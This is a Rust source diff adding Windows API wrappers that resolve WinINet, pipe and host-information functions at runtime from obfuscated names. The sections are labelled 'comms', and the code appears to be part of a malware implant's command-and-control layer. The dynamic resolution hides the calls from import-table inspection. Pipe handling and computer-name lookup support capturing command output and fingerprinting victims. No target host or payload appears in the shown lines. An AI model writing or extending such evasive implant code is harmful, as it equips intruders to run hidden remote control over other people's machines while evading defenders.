@@ -435,3 +435,84 @@ pub unsafe fn CloseServiceHandle(handle: *mut c_void) -> i32 {
     let f: F = std::mem::transmute(resolve_load(crate::obf::ADVAPI32, crate::obf::W_CLOSE_SERVICE_HANDLE));
     f(handle)
 }
+
+// -- wininet (comms) -------------------------------------------------------
+
+#[cfg(windows)]
+pub unsafe fn InternetOpenA(agent: *const u8, access_type: u32, proxy: *const u8, proxy_bypass: *const u8, flags: u32) -> *mut c_void {
+    type F = unsafe extern "system" fn(*const u8, u32, *const u8, *const u8, u32) -> *mut c_void;
+    let f: F = std::mem::transmute(resolve_load(crate::obf::WININET, crate::obf::W_INTERNET_OPEN_A));
+    f(agent, access_type, proxy, proxy_bypass, flags)
+}
+
+#[cfg(windows)]
+pub unsafe fn InternetConnectA(internet: *mut c_void, server: *const u8, port: u16, user: *const u8, pass: *const u8, service: u32, flags: u32, context: usize) -> *mut c_void {
+    type F = unsafe extern "system" fn(*mut c_void, *const u8, u16, *const u8, *const u8, u32, u32, usize) -> *mut c_void;
+    let f: F = std::mem::transmute(resolve_load(crate::obf::WININET, crate::obf::W_INTERNET_CONNECT_A));
+    f(internet, server, port, user, pass, service, flags, context)
+}
+
+#[cfg(windows)]
+pub unsafe fn HttpOpenRequestA(connect: *mut c_void, verb: *const u8, path: *const u8, version: *const u8, referrer: *const u8, accept_types: *const *const u8, flags: u32, context: usize) -> *mut c_void {
+    type F = unsafe extern "system" fn(*mut c_void, *const u8, *const u8, *const u8, *const u8, *const *const u8, u32, usize) -> *mut c_void;
+    let f: F = std::mem::transmute(resolve_load(crate::obf::WININET, crate::obf::W_HTTP_OPEN_REQUEST_A));
+    f(connect, verb, path, version, referrer, accept_types, flags, context)
+}
+
+#[cfg(windows)]
+pub unsafe fn HttpSendRequestA(request: *mut c_void, headers: *const u8, headers_len: u32, optional: *const c_void, optional_len: u32) -> i32 {
+    type F = unsafe extern "system" fn(*mut c_void, *const u8, u32, *const c_void, u32) -> i32;
+    let f: F = std::mem::transmute(resolve_load(crate::obf::WININET, crate::obf::W_HTTP_SEND_REQUEST_A));
+    f(request, headers, headers_len, optional, optional_len)
+}
+
+#[cfg(windows)]
+pub unsafe fn InternetReadFile(file: *mut c_void, buffer: *mut u8, to_read: u32, read: *mut u32) -> i32 {
+    type F = unsafe extern "system" fn(*mut c_void, *mut u8, u32, *mut u32) -> i32;
+    let f: F = std::mem::transmute(resolve_load(crate::obf::WININET, crate::obf::W_INTERNET_READ_FILE));
+    f(file, buffer, to_read, read)
+}
+
+#[cfg(windows)]
+pub unsafe fn InternetCloseHandle(internet: *mut c_void) -> i32 {
+    type F = unsafe extern "system" fn(*mut c_void) -> i32;
+    let f: F = std::mem::transmute(resolve_load(crate::obf::WININET, crate::obf::W_INTERNET_CLOSE_HANDLE));
+    f(internet)
+}
+
+#[cfg(windows)]
+pub unsafe fn HttpQueryInfoA(request: *mut c_void, info_level: u32, buffer: *mut c_void, buffer_len: *mut u32, index: *mut u32) -> i32 {
+    type F = unsafe extern "system" fn(*mut c_void, u32, *mut c_void, *mut u32, *mut u32) -> i32;
+    let f: F = std::mem::transmute(resolve_load(crate::obf::WININET, crate::obf::W_HTTP_QUERY_INFO_A));
+    f(request, info_level, buffer, buffer_len, index)
+}
+
+// -- kernel32 pipe / host (comms) ------------------------------------------
+
+#[cfg(windows)]
+pub unsafe fn CreatePipe(read_pipe: *mut *mut c_void, write_pipe: *mut *mut c_void, attrs: *const c_void, size: u32) -> i32 {
+    type F = unsafe extern "system" fn(*mut *mut c_void, *mut *mut c_void, *const c_void, u32) -> i32;
+    let f: F = std::mem::transmute(resolve(K32, crate::obf::W_CREATE_PIPE));
+    f(read_pipe, write_pipe, attrs, size)
+}
+
+#[cfg(windows)]
+pub unsafe fn ReadFile(file: *mut c_void, buffer: *mut u8, to_read: u32, read: *mut u32, overlapped: *mut c_void) -> i32 {
+    type F = unsafe extern "system" fn(*mut c_void, *mut u8, u32, *mut u32, *mut c_void) -> i32;
+    let f: F = std::mem::transmute(resolve(K32, crate::obf::W_READ_FILE));
+    f(file, buffer, to_read, read, overlapped)
+}
+
+#[cfg(windows)]
+pub unsafe fn SetHandleInformation(object: *mut c_void, mask: u32, flags: u32) -> i32 {
+    type F = unsafe extern "system" fn(*mut c_void, u32, u32) -> i32;
+    let f: F = std::mem::transmute(resolve(K32, crate::obf::W_SET_HANDLE_INFORMATION));
+    f(object, mask, flags)
+}
+
+#[cfg(windows)]
+pub unsafe fn GetComputerNameA(buffer: *mut u8, size: *mut u32) -> i32 {
+    type F = unsafe extern "system" fn(*mut u8, *mut u32) -> i32;
+    let f: F = std::mem::transmute(resolve(K32, crate::obf::W_GET_COMPUTER_NAME_A));
+    f(buffer, size)
+}
